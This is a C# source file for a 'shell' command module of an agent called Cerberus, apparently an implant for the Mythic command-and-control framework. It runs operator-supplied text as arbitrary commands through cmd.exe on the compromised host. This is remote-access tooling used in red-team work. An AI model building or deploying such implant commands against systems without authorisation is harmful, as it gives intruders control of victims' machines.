using Cerberus.Models.Tasks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cerberus.Commands
{
    public class Shell : CerberusCommand
    {
        public override string Name => "shell";

        public override string Execute(MythicTask task)
        {
            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<ShellParam>();

            if (Arguments is null || Arguments.arguments is null)
                return "No arguments supplied. Please supply a command to run";

            Arguments.arguments = string.Join(" ", Arguments.arguments);
            return Internal.Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", $"/c {Arguments.arguments}");
        }
    }

    public class ShellParam
    {
        public string arguments { get; set; }
    }
}
